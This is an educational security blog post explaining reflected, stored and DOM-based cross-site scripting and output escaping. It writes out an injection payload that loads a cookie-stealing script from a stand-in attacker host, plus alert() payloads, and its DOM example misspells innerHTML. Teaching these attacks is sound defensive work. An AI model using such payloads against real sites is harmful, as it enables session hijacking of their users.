---
calendar: security
post_year: 2018
post_day: 13
title: Cross Site Scripting (XSS)
ingress: >-
  At the beginning, web pages were very static. They were written in HTML, and
  the web browser had one job, to render the HTML to a page filled with text,
  images and links. After a few years, the developers wanted more, and
  JavaScript got introduced.Together with JavaScript came a new breed of
  vulnerabilities, where the attackers could exploit the possibility to run code
  in browsers, this was called Cross Site Scripting or XSS.
links:
  - title: CSRF
    url: 'https://security.christmas/2018/4'
  - title: Injections
    url: 'https://security.christmas/2018/8'
  - title: OWASP XSS
    url: >-
      https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
authors:
  - Stian Fredrikstad
---
JavaScript has a lot of possibilities, and a lot of responsibility in modern web applications. First of all, JavaScript can see and read (almost) everything that is sent to the browser, e.g. all the countermeasures we wrote about [CSRF](https://security.christmas/2018/4) some days ago, are no longer valid. This is because JavaScript can read everything, even if it is hidden on the page, send and read as the user.

In addition, JavaScript can read secrets hidden under the domain, like the session cookie. There are countermeasures against it, because JavaScript does not need to explicitly set the cookie on the requests, this is done by the browser automatically. By setting the flag `HttpOnly`, a cookie can never be read by JavaScript, only sent as a header on http requests. But it is a nice example of what we can do, so let us use it.

An XSS can happen in many circumstances, but the main reason is that a user can inject unescaped HTML in a website.This is similar to what we discussed in the post about [Injections](https://security.christmas/2018/8), and in HTML (or XML), the `<`, `>` and `"` are very important for the markup, there are more, but let us start with those. An escaped version of `<` is `&lt;` and `>` is `&gt;` and `"` is `&quot;`, short for "less than, "greater than" and quote if you want to remember those.

### Reflected XSS

If we imagine we are Google. We have a search input field named `q`, where the query is inserted, and the query is put as a get parameter in the url. If we insert `santa`, and click search, the url will be `https://www.google.com?q=santa`. And the input field will render like `<input type="text" name="q" value="santa" />`. If the rendering of the `value` in the input field is not escaped. An attack could be to insert

```html
santa" /><script src="https://www.santastealscookies.com/cookiestealer"></script>
```

This will render the input field like

```html
<input
  type="text"
  name="q"
  value="santa"
/><script src="https://www.santastealscookies.com/cookiestealer"></script
>" />
```

As we see, `" />` closes the input field and let the attacker continue to write HTML. Which in this case let santa steal all the cookies from the users who click on the link with the malicious input.

This is called "Reflected XSS", because the input from the user is reflected on the website But this does also limit the reach of such an attack, because the user often needs to click on something before it works.

### Stored XSS

We also have the "Stored XSS", which is quite similar to "reflected XSS", but here the malicious input is stored on the server, and could possibly affect all users. If Santa creates a blog where he writes about his Christmas preparations, he would likely create a comment section for input from his fans. The comments are printed out in the bottom of each blog post, but Santa forgot to escape the comments on the web server. If the Grinch finds this, and creates a comment with the input:

```html
<script>
  alert('The Santa does not exist');
</script>
```

All the readers of that blog post are met by a popup with the text "Santa does not" exist.

As we see in this last example, the XSS does not need to happen in an attribute. It can happen all places where text is rendered. That is why the web server should always escape everything, except those places you actually write HTML-code.

### DOM based XSS

The last type of XSS is "DOM based XSS". The main difference between this and the other two, is that it all happens in JavaScript. JavaScript has methods like `innerHTML`, which can be used to fill another element with text, but it does also allow HTML to be written.

As a simple example, we have a `div` with the id `website`, where we want to display the url of the current website. Code to fill this could look like:

```html
<script>
  document.getElementById('website').inneHTML = document.baseURI;
</script>
```

An example of a malicious url would be `https://www.santaisbad.com/#<script>alert("Santa is good");</script>`. And we will get the well-known alert box. But the most important is that the developer does not even know that the website is being exploited. The web browser does not send the `#`, and everything after it to the server, which makes it difficult discover.

In addition to escaping what we render, to get rid of "DOM based XSS", we need to go through the code and use the correct methods (or even delete vulnerable code where this can happen, like `eval`). Instead of using innerHTML, we should have used innerText and so on.

As a final reminder, escape everything, and take care when rendering mixes of text and HTML.

In many frameworks, both server and client side, it is the default behaviour to escape output, but you need to check this to be sure.
